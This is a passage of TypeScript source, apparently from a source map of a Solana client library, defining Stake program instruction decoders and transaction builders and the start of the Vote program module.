newAuthorizedPubkey: PublicKey;\n  stakeAuthorizationType: StakeAuthorizationType;\n  custodianPubkey?: PublicKey;\n};\n\n/**\n * Split stake instruction params\n */\nexport type SplitStakeParams = {\n  stakePubkey: PublicKey;\n  authorizedPubkey: PublicKey;\n  splitStakePubkey: PublicKey;\n  lamports: number;\n};\n\n/**\n * Split with seed transaction params\n */\nexport type SplitStakeWithSeedParams = {\n  stakePubkey: PublicKey;\n  authorizedPubkey: PublicKey;\n  splitStakePubkey: PublicKey;\n  basePubkey: PublicKey;\n  seed: string;\n  lamports: number;\n};\n\n/**\n * Withdraw stake instruction params\n */\nexport type WithdrawStakeParams = {\n  stakePubkey: PublicKey;\n  authorizedPubkey: PublicKey;\n  toPubkey: PublicKey;\n  lamports: number;\n  custodianPubkey?: PublicKey;\n};\n\n/**\n * Deactivate stake instruction params\n */\nexport type DeactivateStakeParams = {\n  stakePubkey: PublicKey;\n  authorizedPubkey: PublicKey;\n};\n\n/**\n * Merge stake instruction params\n */\nexport type MergeStakeParams = {\n  stakePubkey: PublicKey;\n  sourceStakePubKey: PublicKey;\n  authorizedPubkey: PublicKey;\n};\n\n/**\n * Stake Instruction class\n */\nexport class StakeInstruction {\n  /**\n   * @internal\n   */\n  constructor() {}\n\n  /**\n   * Decode a stake instruction and retrieve the instruction type.\n   */\n  static decodeInstructionType(\n    instruction: TransactionInstruction,\n  ): StakeInstructionType {\n    this.checkProgramId(instruction.programId);\n\n    const instructionTypeLayout = BufferLayout.u32('instruction');\n    const typeIndex = instructionTypeLayout.decode(instruction.data);\n\n    let type: StakeInstructionType | undefined;\n    for (const [ixType, layout] of Object.entries(STAKE_INSTRUCTION_LAYOUTS)) {\n      if (layout.index == typeIndex) {\n        type = ixType as StakeInstructionType;\n        break;\n      }\n    }\n\n    if (!type) {\n      throw new Error('Instruction type incorrect; not a StakeInstruction');\n    }\n\n    return type;\n  }\n\n  /**\n   * Decode a initialize stake instruction and retrieve the instruction params.\n   */\n  static decodeInitialize(\n    instruction: TransactionInstruction,\n  ): InitializeStakeParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 2);\n\n    const {authorized, lockup} = decodeData(\n      STAKE_INSTRUCTION_LAYOUTS.Initialize,\n      instruction.data,\n    );\n\n    return {\n      stakePubkey: instruction.keys[0].pubkey,\n      authorized: new Authorized(\n        new PublicKey(authorized.staker),\n        new PublicKey(authorized.withdrawer),\n      ),\n      lockup: new Lockup(\n        lockup.unixTimestamp,\n        lockup.epoch,\n        new PublicKey(lockup.custodian),\n      ),\n    };\n  }\n\n  /**\n   * Decode a delegate stake instruction and retrieve the instruction params.\n   */\n  static decodeDelegate(\n    instruction: TransactionInstruction,\n  ): DelegateStakeParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 6);\n    decodeData(STAKE_INSTRUCTION_LAYOUTS.Delegate, instruction.data);\n\n    return {\n      stakePubkey: instruction.keys[0].pubkey,\n      votePubkey: instruction.keys[1].pubkey,\n      authorizedPubkey: instruction.keys[5].pubkey,\n    };\n  }\n\n  /**\n   * Decode an authorize stake instruction and retrieve the instruction params.\n   */\n  static decodeAuthorize(\n    instruction: TransactionInstruction,\n  ): AuthorizeStakeParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 3);\n    const {newAuthorized, stakeAuthorizationType} = decodeData(\n      STAKE_INSTRUCTION_LAYOUTS.Authorize,\n      instruction.data,\n    );\n\n    const o: AuthorizeStakeParams = {\n      stakePubkey: instruction.keys[0].pubkey,\n      authorizedPubkey: instruction.keys[2].pubkey,\n      newAuthorizedPubkey: new PublicKey(newAuthorized),\n      stakeAuthorizationType: {\n        index: stakeAuthorizationType,\n      },\n    };\n    if (instruction.keys.length > 3) {\n      o.custodianPubkey = instruction.keys[3].pubkey;\n    }\n    return o;\n  }\n\n  /**\n   * Decode an authorize-with-seed stake instruction and retrieve the instruction params.\n   */\n  static decodeAuthorizeWithSeed(\n    instruction: TransactionInstruction,\n  ): AuthorizeWithSeedStakeParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 2);\n\n    const {\n      newAuthorized,\n      stakeAuthorizationType,\n      authoritySeed,\n      authorityOwner,\n    } = decodeData(\n      STAKE_INSTRUCTION_LAYOUTS.AuthorizeWithSeed,\n      instruction.data,\n    );\n\n    const o: AuthorizeWithSeedStakeParams = {\n      stakePubkey: instruction.keys[0].pubkey,\n      authorityBase: instruction.keys[1].pubkey,\n      authoritySeed: authoritySeed,\n      authorityOwner: new PublicKey(authorityOwner),\n      newAuthorizedPubkey: new PublicKey(newAuthorized),\n      stakeAuthorizationType: {\n        index: stakeAuthorizationType,\n      },\n    };\n    if (instruction.keys.length > 3) {\n      o.custodianPubkey = instruction.keys[3].pubkey;\n    }\n    return o;\n  }\n\n  /**\n   * Decode a split stake instruction and retrieve the instruction params.\n   */\n  static decodeSplit(instruction: TransactionInstruction): SplitStakeParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 3);\n    const {lamports} = decodeData(\n      STAKE_INSTRUCTION_LAYOUTS.Split,\n      instruction.data,\n    );\n\n    return {\n      stakePubkey: instruction.keys[0].pubkey,\n      splitStakePubkey: instruction.keys[1].pubkey,\n      authorizedPubkey: instruction.keys[2].pubkey,\n      lamports,\n    };\n  }\n\n  /**\n   * Decode a merge stake instruction and retrieve the instruction params.\n   */\n  static decodeMerge(instruction: TransactionInstruction): MergeStakeParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 3);\n    decodeData(STAKE_INSTRUCTION_LAYOUTS.Merge, instruction.data);\n\n    return {\n      stakePubkey: instruction.keys[0].pubkey,\n      sourceStakePubKey: instruction.keys[1].pubkey,\n      authorizedPubkey: instruction.keys[4].pubkey,\n    };\n  }\n\n  /**\n   * Decode a withdraw stake instruction and retrieve the instruction params.\n   */\n  static decodeWithdraw(\n    instruction: TransactionInstruction,\n  ): WithdrawStakeParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 5);\n    const {lamports} = decodeData(\n      STAKE_INSTRUCTION_LAYOUTS.Withdraw,\n      instruction.data,\n    );\n\n    const o: WithdrawStakeParams = {\n      stakePubkey: instruction.keys[0].pubkey,\n      toPubkey: instruction.keys[1].pubkey,\n      authorizedPubkey: instruction.keys[4].pubkey,\n      lamports,\n    };\n    if (instruction.keys.length > 5) {\n      o.custodianPubkey = instruction.keys[5].pubkey;\n    }\n    return o;\n  }\n\n  /**\n   * Decode a deactivate stake instruction and retrieve the instruction params.\n   */\n  static decodeDeactivate(\n    instruction: TransactionInstruction,\n  ): DeactivateStakeParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 3);\n    decodeData(STAKE_INSTRUCTION_LAYOUTS.Deactivate, instruction.data);\n\n    return {\n      stakePubkey: instruction.keys[0].pubkey,\n      authorizedPubkey: instruction.keys[2].pubkey,\n    };\n  }\n\n  /**\n   * @internal\n   */\n  static checkProgramId(programId: PublicKey) {\n    if (!programId.equals(StakeProgram.programId)) {\n      throw new Error('invalid instruction; programId is not StakeProgram');\n    }\n  }\n\n  /**\n   * @internal\n   */\n  static checkKeyLength(keys: Array<any>, expectedLength: number) {\n    if (keys.length < expectedLength) {\n      throw new Error(\n        `invalid instruction; found ${keys.length} keys, expected at least ${expectedLength}`,\n      );\n    }\n  }\n}\n\n/**\n * An enumeration of valid StakeInstructionType's\n */\nexport type StakeInstructionType =\n  // FIXME\n  // It would be preferable for this type to be `keyof StakeInstructionInputData`\n  // but Typedoc does not transpile `keyof` expressions.\n  // See https://github.com/TypeStrong/typedoc/issues/1894\n  | 'Authorize'\n  | 'AuthorizeWithSeed'\n  | 'Deactivate'\n  | 'Delegate'\n  | 'Initialize'\n  | 'Merge'\n  | 'Split'\n  | 'Withdraw';\n\ntype StakeInstructionInputData = {\n  Authorize: IInstructionInputData &\n    Readonly<{\n      newAuthorized: Uint8Array;\n      stakeAuthorizationType: number;\n    }>;\n  AuthorizeWithSeed: IInstructionInputData &\n    Readonly<{\n      authorityOwner: Uint8Array;\n      authoritySeed: string;\n      instruction: number;\n      newAuthorized: Uint8Array;\n      stakeAuthorizationType: number;\n    }>;\n  Deactivate: IInstructionInputData;\n  Delegate: IInstructionInputData;\n  Initialize: IInstructionInputData &\n    Readonly<{\n      authorized: AuthorizedRaw;\n      lockup: LockupRaw;\n    }>;\n  Merge: IInstructionInputData;\n  Split: IInstructionInputData &\n    Readonly<{\n      lamports: number;\n    }>;\n  Withdraw: IInstructionInputData &\n    Readonly<{\n      lamports: number;\n    }>;\n};\n\n/**\n * An enumeration of valid stake InstructionType's\n * @internal\n */\nexport const STAKE_INSTRUCTION_LAYOUTS = Object.freeze<{\n  [Instruction in StakeInstructionType]: InstructionType<\n    StakeInstructionInputData[Instruction]\n  >;\n}>({\n  Initialize: {\n    index: 0,\n    layout: BufferLayout.struct<StakeInstructionInputData['Initialize']>([\n      BufferLayout.u32('instruction'),\n      Layout.authorized(),\n      Layout.lockup(),\n    ]),\n  },\n  Authorize: {\n    index: 1,\n    layout: BufferLayout.struct<StakeInstructionInputData['Authorize']>([\n      BufferLayout.u32('instruction'),\n      Layout.publicKey('newAuthorized'),\n      BufferLayout.u32('stakeAuthorizationType'),\n    ]),\n  },\n  Delegate: {\n    index: 2,\n    layout: BufferLayout.struct<StakeInstructionInputData['Delegate']>([\n      BufferLayout.u32('instruction'),\n    ]),\n  },\n  Split: {\n    index: 3,\n    layout: BufferLayout.struct<StakeInstructionInputData['Split']>([\n      BufferLayout.u32('instruction'),\n      BufferLayout.ns64('lamports'),\n    ]),\n  },\n  Withdraw: {\n    index: 4,\n    layout: BufferLayout.struct<StakeInstructionInputData['Withdraw']>([\n      BufferLayout.u32('instruction'),\n      BufferLayout.ns64('lamports'),\n    ]),\n  },\n  Deactivate: {\n    index: 5,\n    layout: BufferLayout.struct<StakeInstructionInputData['Deactivate']>([\n      BufferLayout.u32('instruction'),\n    ]),\n  },\n  Merge: {\n    index: 7,\n    layout: BufferLayout.struct<StakeInstructionInputData['Merge']>([\n      BufferLayout.u32('instruction'),\n    ]),\n  },\n  AuthorizeWithSeed: {\n    index: 8,\n    layout: BufferLayout.struct<StakeInstructionInputData['AuthorizeWithSeed']>(\n      [\n        BufferLayout.u32('instruction'),\n        Layout.publicKey('newAuthorized'),\n        BufferLayout.u32('stakeAuthorizationType'),\n        Layout.rustString('authoritySeed'),\n        Layout.publicKey('authorityOwner'),\n      ],\n    ),\n  },\n});\n\n/**\n * Stake authorization type\n */\nexport type StakeAuthorizationType = {\n  /** The Stake Authorization index (from solana-stake-program) */\n  index: number;\n};\n\n/**\n * An enumeration of valid StakeAuthorizationLayout's\n */\nexport const StakeAuthorizationLayout = Object.freeze({\n  Staker: {\n    index: 0,\n  },\n  Withdrawer: {\n    index: 1,\n  },\n});\n\n/**\n * Factory class for transactions to interact with the Stake program\n */\nexport class StakeProgram {\n  /**\n   * @internal\n   */\n  constructor() {}\n\n  /**\n   * Public key that identifies the Stake program\n   */\n  static programId: PublicKey = new PublicKey(\n    'Stake11111111111111111111111111111111111111',\n  );\n\n  /**\n   * Max space of a Stake account\n   *\n   * This is generated from the solana-stake-program StakeState struct as\n   * `StakeStateV2::size_of()`:\n   * https://docs.rs/solana-stake-program/latest/solana_stake_program/stake_state/enum.StakeStateV2.html\n   */\n  static space: number = 200;\n\n  /**\n   * Generate an Initialize instruction to add to a Stake Create transaction\n   */\n  static initialize(params: InitializeStakeParams): TransactionInstruction {\n    const {stakePubkey, authorized, lockup: maybeLockup} = params;\n    const lockup: Lockup = maybeLockup || Lockup.default;\n    const type = STAKE_INSTRUCTION_LAYOUTS.Initialize;\n    const data = encodeData(type, {\n      authorized: {\n        staker: toBuffer(authorized.staker.toBuffer()),\n        withdrawer: toBuffer(authorized.withdrawer.toBuffer()),\n      },\n      lockup: {\n        unixTimestamp: lockup.unixTimestamp,\n        epoch: lockup.epoch,\n        custodian: toBuffer(lockup.custodian.toBuffer()),\n      },\n    });\n    const instructionData = {\n      keys: [\n        {pubkey: stakePubkey, isSigner: false, isWritable: true},\n        {pubkey: SYSVAR_RENT_PUBKEY, isSigner: false, isWritable: false},\n      ],\n      programId: this.programId,\n      data,\n    };\n    return new TransactionInstruction(instructionData);\n  }\n\n  /**\n   * Generate a Transaction that creates a new Stake account at\n   *   an address generated with `from`, a seed, and the Stake programId\n   */\n  static createAccountWithSeed(\n    params: CreateStakeAccountWithSeedParams,\n  ): Transaction {\n    const transaction = new Transaction();\n    transaction.add(\n      SystemProgram.createAccountWithSeed({\n        fromPubkey: params.fromPubkey,\n        newAccountPubkey: params.stakePubkey,\n        basePubkey: params.basePubkey,\n        seed: params.seed,\n        lamports: params.lamports,\n        space: this.space,\n        programId: this.programId,\n      }),\n    );\n\n    const {stakePubkey, authorized, lockup} = params;\n    return transaction.add(this.initialize({stakePubkey, authorized, lockup}));\n  }\n\n  /**\n   * Generate a Transaction that creates a new Stake account\n   */\n  static createAccount(params: CreateStakeAccountParams): Transaction {\n    const transaction = new Transaction();\n    transaction.add(\n      SystemProgram.createAccount({\n        fromPubkey: params.fromPubkey,\n        newAccountPubkey: params.stakePubkey,\n        lamports: params.lamports,\n        space: this.space,\n        programId: this.programId,\n      }),\n    );\n\n    const {stakePubkey, authorized, lockup} = params;\n    return transaction.add(this.initialize({stakePubkey, authorized, lockup}));\n  }\n\n  /**\n   * Generate a Transaction that delegates Stake tokens to a validator\n   * Vote PublicKey. This transaction can also be used to redelegate Stake\n   * to a new validator Vote PublicKey.\n   */\n  static delegate(params: DelegateStakeParams): Transaction {\n    const {stakePubkey, authorizedPubkey, votePubkey} = params;\n\n    const type = STAKE_INSTRUCTION_LAYOUTS.Delegate;\n    const data = encodeData(type);\n\n    return new Transaction().add({\n      keys: [\n        {pubkey: stakePubkey, isSigner: false, isWritable: true},\n        {pubkey: votePubkey, isSigner: false, isWritable: false},\n        {pubkey: SYSVAR_CLOCK_PUBKEY, isSigner: false, isWritable: false},\n        {\n          pubkey: SYSVAR_STAKE_HISTORY_PUBKEY,\n          isSigner: false,\n          isWritable: false,\n        },\n        {pubkey: STAKE_CONFIG_ID, isSigner: false, isWritable: false},\n        {pubkey: authorizedPubkey, isSigner: true, isWritable: false},\n      ],\n      programId: this.programId,\n      data,\n    });\n  }\n\n  /**\n   * Generate a Transaction that authorizes a new PublicKey as Staker\n   * or Withdrawer on the Stake account.\n   */\n  static authorize(params: AuthorizeStakeParams): Transaction {\n    const {\n      stakePubkey,\n      authorizedPubkey,\n      newAuthorizedPubkey,\n      stakeAuthorizationType,\n      custodianPubkey,\n    } = params;\n\n    const type = STAKE_INSTRUCTION_LAYOUTS.Authorize;\n    const data = encodeData(type, {\n      newAuthorized: toBuffer(newAuthorizedPubkey.toBuffer()),\n      stakeAuthorizationType: stakeAuthorizationType.index,\n    });\n\n    const keys = [\n      {pubkey: stakePubkey, isSigner: false, isWritable: true},\n      {pubkey: SYSVAR_CLOCK_PUBKEY, isSigner: false, isWritable: true},\n      {pubkey: authorizedPubkey, isSigner: true, isWritable: false},\n    ];\n    if (custodianPubkey) {\n      keys.push({\n        pubkey: custodianPubkey,\n        isSigner: true,\n        isWritable: false,\n      });\n    }\n    return new Transaction().add({\n      keys,\n      programId: this.programId,\n      data,\n    });\n  }\n\n  /**\n   * Generate a Transaction that authorizes a new PublicKey as Staker\n   * or Withdrawer on the Stake account.\n   */\n  static authorizeWithSeed(params: AuthorizeWithSeedStakeParams): Transaction {\n    const {\n      stakePubkey,\n      authorityBase,\n      authoritySeed,\n      authorityOwner,\n      newAuthorizedPubkey,\n      stakeAuthorizationType,\n      custodianPubkey,\n    } = params;\n\n    const type = STAKE_INSTRUCTION_LAYOUTS.AuthorizeWithSeed;\n    const data = encodeData(type, {\n      newAuthorized: toBuffer(newAuthorizedPubkey.toBuffer()),\n      stakeAuthorizationType: stakeAuthorizationType.index,\n      authoritySeed: authoritySeed,\n      authorityOwner: toBuffer(authorityOwner.toBuffer()),\n    });\n\n    const keys = [\n      {pubkey: stakePubkey, isSigner: false, isWritable: true},\n      {pubkey: authorityBase, isSigner: true, isWritable: false},\n      {pubkey: SYSVAR_CLOCK_PUBKEY, isSigner: false, isWritable: false},\n    ];\n    if (custodianPubkey) {\n      keys.push({\n        pubkey: custodianPubkey,\n        isSigner: true,\n        isWritable: false,\n      });\n    }\n    return new Transaction().add({\n      keys,\n      programId: this.programId,\n      data,\n    });\n  }\n\n  /**\n   * @internal\n   */\n  static splitInstruction(params: SplitStakeParams): TransactionInstruction {\n    const {stakePubkey, authorizedPubkey, splitStakePubkey, lamports} = params;\n    const type = STAKE_INSTRUCTION_LAYOUTS.Split;\n    const data = encodeData(type, {lamports});\n    return new TransactionInstruction({\n      keys: [\n        {pubkey: stakePubkey, isSigner: false, isWritable: true},\n        {pubkey: splitStakePubkey, isSigner: false, isWritable: true},\n        {pubkey: authorizedPubkey, isSigner: true, isWritable: false},\n      ],\n      programId: this.programId,\n      data,\n    });\n  }\n\n  /**\n   * Generate a Transaction that splits Stake tokens into another stake account\n   */\n  static split(\n    params: SplitStakeParams,\n    // Compute the cost of allocating the new stake account in lamports\n    rentExemptReserve: number,\n  ): Transaction {\n    const transaction = new Transaction();\n    transaction.add(\n      SystemProgram.createAccount({\n        fromPubkey: params.authorizedPubkey,\n        newAccountPubkey: params.splitStakePubkey,\n        lamports: rentExemptReserve,\n        space: this.space,\n        programId: this.programId,\n      }),\n    );\n    return transaction.add(this.splitInstruction(params));\n  }\n\n  /**\n   * Generate a Transaction that splits Stake tokens into another account\n   * derived from a base public key and seed\n   */\n  static splitWithSeed(\n    params: SplitStakeWithSeedParams,\n    // If this stake account is new, compute the cost of allocating it in lamports\n    rentExemptReserve?: number,\n  ): Transaction {\n    const {\n      stakePubkey,\n      authorizedPubkey,\n      splitStakePubkey,\n      basePubkey,\n      seed,\n      lamports,\n    } = params;\n    const transaction = new Transaction();\n    transaction.add(\n      SystemProgram.allocate({\n        accountPubkey: splitStakePubkey,\n        basePubkey,\n        seed,\n        space: this.space,\n        programId: this.programId,\n      }),\n    );\n    if (rentExemptReserve && rentExemptReserve > 0) {\n      transaction.add(\n        SystemProgram.transfer({\n          fromPubkey: params.authorizedPubkey,\n          toPubkey: splitStakePubkey,\n          lamports: rentExemptReserve,\n        }),\n      );\n    }\n    return transaction.add(\n      this.splitInstruction({\n        stakePubkey,\n        authorizedPubkey,\n        splitStakePubkey,\n        lamports,\n      }),\n    );\n  }\n\n  /**\n   * Generate a Transaction that merges Stake accounts.\n   */\n  static merge(params: MergeStakeParams): Transaction {\n    const {stakePubkey, sourceStakePubKey, authorizedPubkey} = params;\n    const type = STAKE_INSTRUCTION_LAYOUTS.Merge;\n    const data = encodeData(type);\n\n    return new Transaction().add({\n      keys: [\n        {pubkey: stakePubkey, isSigner: false, isWritable: true},\n        {pubkey: sourceStakePubKey, isSigner: false, isWritable: true},\n        {pubkey: SYSVAR_CLOCK_PUBKEY, isSigner: false, isWritable: false},\n        {\n          pubkey: SYSVAR_STAKE_HISTORY_PUBKEY,\n          isSigner: false,\n          isWritable: false,\n        },\n        {pubkey: authorizedPubkey, isSigner: true, isWritable: false},\n      ],\n      programId: this.programId,\n      data,\n    });\n  }\n\n  /**\n   * Generate a Transaction that withdraws deactivated Stake tokens.\n   */\n  static withdraw(params: WithdrawStakeParams): Transaction {\n    const {stakePubkey, authorizedPubkey, toPubkey, lamports, custodianPubkey} =\n      params;\n    const type = STAKE_INSTRUCTION_LAYOUTS.Withdraw;\n    const data = encodeData(type, {lamports});\n\n    const keys = [\n      {pubkey: stakePubkey, isSigner: false, isWritable: true},\n      {pubkey: toPubkey, isSigner: false, isWritable: true},\n      {pubkey: SYSVAR_CLOCK_PUBKEY, isSigner: false, isWritable: false},\n      {\n        pubkey: SYSVAR_STAKE_HISTORY_PUBKEY,\n        isSigner: false,\n        isWritable: false,\n      },\n      {pubkey: authorizedPubkey, isSigner: true, isWritable: false},\n    ];\n    if (custodianPubkey) {\n      keys.push({\n        pubkey: custodianPubkey,\n        isSigner: true,\n        isWritable: false,\n      });\n    }\n    return new Transaction().add({\n      keys,\n      programId: this.programId,\n      data,\n    });\n  }\n\n  /**\n   * Generate a Transaction that deactivates Stake tokens.\n   */\n  static deactivate(params: DeactivateStakeParams): Transaction {\n    const {stakePubkey, authorizedPubkey} = params;\n    const type = STAKE_INSTRUCTION_LAYOUTS.Deactivate;\n    const data = encodeData(type);\n\n    return new Transaction().add({\n      keys: [\n        {pubkey: stakePubkey, isSigner: false, isWritable: true},\n        {pubkey: SYSVAR_CLOCK_PUBKEY, isSigner: false, isWritable: false},\n        {pubkey: authorizedPubkey, isSigner: true, isWritable: false},\n      ],\n      programId: this.programId,\n      data,\n    });\n  }\n}\n","import * as BufferLayout from '@solana/buffer-layout';\n\nimport {\n  encodeData,\n  decodeData,\n  InstructionType,\n  IInstructionInputData,\n} from '../instruction';\nimport * as Layout from '../layout';\nimport {PublicKey} from '../publickey';\nimport {SystemProgram} from './system';\nimport {SYSVAR_CLOCK_PUBKEY, SYSVAR_RENT_PUBKEY} from '../sysvar';\nimport {Transaction, TransactionInstruction} from '../transaction';\nimport {toBuffer} from '../utils/to-buffer';\n\n/**\n * Vote account info\n */\nexport class VoteInit {\n  nodePubkey: PublicKey;\n  authorizedVoter: PublicKey;\n  authorizedWithdrawer: PublicKey;\n  commission: number; /** [0, 100] */\n\n  constructor(\n    nodePubkey: PublicKey,\n    authorizedVoter: PublicKey,\n    authorizedWithdrawer: PublicKey,\n    commission: number,\n  ) {\n    this.nodePubkey = nodePubkey;\n    this.authorizedVoter = authorizedVoter;\n    this.authorizedWithdrawer = authorizedWithdrawer;\n    this.commission = commission;\n  }\n}\n\n/**\n * Create vote account transaction params\n */\nexport type CreateVoteAccountParams = {\n  fromPubkey: PublicKey;\n  votePubkey: PublicKey;\n  voteInit: VoteInit;\n  lamports: number;\n};\n\n/**\n * InitializeAccount instruction params\n */\nexport type InitializeAccountParams = {\n  votePubkey: PublicKey;\n  nodePubkey: PublicKey;\n  voteInit: VoteInit;\n};\n\n/**\n * Authorize instruction params\n */\nexport type AuthorizeVoteParams = {\n  votePubkey: PublicKey;\n  /** Current vote or withdraw authority, depending on `voteAuthorizationType` */\n  authorizedPubkey: PublicKey;\n  newAuthorizedPubkey: PublicKey;\n  voteAuthorizationType: VoteAuthorizationType;\n};\n\n/**\n * AuthorizeWithSeed instruction params\n */\nexport type AuthorizeVoteWithSeedParams = {\n  currentAuthorityDerivedKeyBasePubkey: PublicKey;\n  currentAuthorityDerivedKeyOwnerPubkey: PublicKey;\n  currentAuthorityDerivedKeySeed: string;\n  newAuthorizedPubkey: PublicKey;\n  voteAuthorizationType: VoteAuthorizationType;\n  votePubkey: PublicKey;\n};\n\n/**\n * Withdraw from vote account transaction params\n */\nexport type WithdrawFromVoteAccountParams = {\n  votePubkey: PublicKey;\n  authorizedWithdrawerPubkey: PublicKey;\n  lamports: number;\n  toPubkey: PublicKey;\n};\n\n/**\n * Update validator identity (node pubkey) vote account instruction params.\n */\nexport type UpdateValidatorIdentityParams = {\n  votePubkey: PublicKey;\n  authorizedWithdrawerPubkey: PublicKey;\n  nodePubkey: PublicKey;\n};\n\n/**\n * Vote Instruction class\n */\nexport class VoteInstruction {\n  /**\n   * @internal\n   */\n  constructor() {}\n\n  /**\n   * Decode a vote instruction and retrieve the instruction type.\n   */\n  static decodeInstructionType(\n    instruction: TransactionInstruction,\n  ): VoteInstructionType {\n    this.checkProgramId(instruction.programId);\n\n    const instructionTypeLayout = BufferLayout.u32('instruction');\n    const typeIndex = instructionTypeLayout.decode(instruction.data);\n\n    let type: VoteInstructionType | undefined;\n    for (const [ixType, layout] of Object.entries(VOTE_INSTRUCTION_LAYOUTS)) {\n      if (layout.index == typeIndex) {\n        type = ixType as VoteInstructionType;\n        break;\n      }\n    }\n\n    if (!type) {\n      throw new Error('Instruction type incorrect; not a VoteInstruction');\n    }\n\n    return type;\n  }\n\n  /**\n   * Decode an initialize vote instruction and retrieve the instruction params.\n   */\n  static decodeInitializeAccount(\n    instruction: TransactionInstruction,\n  ): InitializeAccountParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 4);\n\n    const {voteInit} = decodeData(\n      VOTE_INSTRUCTION_LAYOUTS.InitializeAccount,\n      instruction.data,\n    );\n\n    return {\n      votePubkey: instruction.keys[0].pubkey,\n      nodePubkey: instruction.keys[3].pubkey,\n      voteInit: new VoteInit(\n        new PublicKey(voteInit.nodePubkey),\n        new PublicKey(voteInit.authorizedVoter),\n        new PublicKey(voteInit.authorizedWithdrawer),\n        voteInit.commission,\n      ),\n    };\n  }\n\n  /**\n   * Decode an authorize instruction and retrieve the instruction params.\n   */\n  static decodeAuthorize(\n    instruction: TransactionInstruction,\n  ): AuthorizeVoteParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 3);\n\n    const {newAuthorized, voteAuthorizationType} = decodeData(\n      VOTE_INSTRUCTION_LAYOUTS.Authorize,\n      instruction.data,\n    );\n\n    return {\n      votePubkey: instruction.keys[0].pubkey,\n      authorizedPubkey: instruction.keys[2].pubkey,\n      newAuthorizedPubkey: new PublicKey(newAuthorized),\n      voteAuthorizationType: {\n        index: voteAuthorizationType,\n      },\n    };\n  }\n\n  /**\n   * Decode an authorize instruction and retrieve the instruction params.\n   */\n  static decodeAuthorizeWithSeed(\n    instruction: TransactionInstruction,\n  ): AuthorizeVoteWithSeedParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 3);\n\n    const {\n      voteAuthorizeWithSeedArgs: {\n        currentAuthorityDerivedKeyOwnerPubkey,\n        currentAuthorityDerivedKeySeed,\n        newAuthorized,\n        voteAuthorizationType,\n      },\n    } = decodeData(\n      VOTE_INSTRUCTION_LAYOUTS.AuthorizeWithSeed,\n      instruction.data,\n    );\n\n    return {\n      currentAuthorityDerivedKeyBasePubkey: instruction.keys[2].pubkey,\n      currentAuthorityDerivedKeyOwnerPubkey: new PublicKey(\n        currentAuthorityDerivedKeyOwnerPubkey,\n      ),\n      currentAuthorityDerivedKeySeed: currentAuthorityDerivedKeySeed,\n      newAuthorizedPubkey: new PublicKey(newAuthorized),\n      voteAuthorizationType: {\n        index: voteAuthorizationType,\n      },\n      votePubkey: instruction.keys[0].pubkey,\n    };\n  }\n\n  /**\n   * Decode a withdraw instruction and retrieve the instruction params.\n   */\n  static decodeWithdraw(\n    instruction: TransactionInstruction,\n  ): WithdrawFromVoteAccountParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 3);\n\n    const {lamports} = decodeData(\n      VOTE_INSTRUCTION_LAYOUTS.Withdraw,\n      instruction.data,\n    );\n\n    return {\n      votePubkey: instruction.keys[0].pubkey,\n      authorizedWithdrawerPubkey: instruction.keys[2].pubkey,\n      lamports,\n      toPubkey: instruction.keys[1].pubkey,\n    };\n  }\n\n  /**\n   * @internal\n   */\n  static checkProgramId(programId: PublicKey) {\n    if (!programId.equals(VoteProgram.programId)) {\n      throw new Error('invalid instruction; programId is not VoteProgram');\n    }\n  }\n\n  /**\n   * @internal\n   */\n  static checkKeyLength(keys: Array<any>, expectedLength: number) {\n    if (keys.length < expectedLength) {\n      throw new Error(\n        `invalid instruction; found ${keys.length} keys, expected at least ${expectedLength}`,\n      );\n    }\n  }\n}\n\n/**\n * An enumeration of valid VoteInstructionType's\n */\nexport type VoteInstructionType =\n  // FIXME\n  // It would be preferable for this type to be `keyof VoteInstructionInputData`\n  // but Typedoc does not transpile `keyof` expressions.\n  // See https://github.com/TypeStrong/typedoc/issues/1894\n  | 'Authorize'\n  | 'AuthorizeWithSeed'\n  | 'InitializeAccount'\n  | 'Withdraw'\n  | 'UpdateValidatorIdentity';\n\n/** @internal */\nexport type VoteAuthorizeWithSeedArgs = Readonly<{\n  currentAuthorityDerivedKeyOwnerPubkey: Uint8Array;\n  currentAuthorityDerivedKeySeed: string;\n  newAuthorized: Uint8Array;\n  voteAuthorizationType: number;\n}>;\ntype VoteInstructionInputData = {\n  Authorize: IInstructionInputData & {\n    newAuthorized: Uint8Array;\n    voteAuthorizationType: number;\n  };\n  AuthorizeWithSeed: IInstructionInputData & {\n    voteAuthorizeWithSeedArgs: VoteAuthorizeWithSeedArgs;\n  };\n  InitializeAccount: IInstructionInputData & {\n    voteInit: Readonly<{\n      authorizedVoter: Uint8Array;\n      authorizedWithdrawer: Uint8Array;\n      commission: number;\n      nodePubkey: Uint8Array;\n    }>;\n  };\n  Withdraw: IInstructionInputData & {\n    lamports: number;\n  };\n  UpdateValidatorIdentity: IInstructionInputData;\n};\n\nconst VOTE_INSTRUCTION_LAYOUTS = Object.freeze<{\n  [Instruction in VoteInstructionType]: InstructionType<\n    VoteInstructionInputData[Instruction]\n  >;\n}>({\n  InitializeAccount: {\n    index: 0,\n    layout: BufferLayout.struct<VoteInstructionInputData['InitializeAccount']>([\n      BufferLayout.u32('instruction'),\n      Layout.voteInit(),\n    ]),\n  },\n  Authorize: {\n    index: 1,\n    layout: BufferLayout.struct<VoteInstructionInputData['Authorize']>([\n      BufferLayout.u32('instruction'),\n      Layout.publicKey('newAuthorized'),\n      BufferLayout.u32('voteAuthorizationType'),\n    ]),\n  },\n  Withdraw: {\n    index: 3,\n    layout: BufferLayout.struct<VoteInstructionInputData['Withdraw']>([\n      BufferLayout.u32('instruction'),\n      BufferLayout.ns64('lamports'),\n    ]),\n  },\n  UpdateValidatorIdentity: {\n    index: 4,\n    layout: BufferLayout.struct<\n      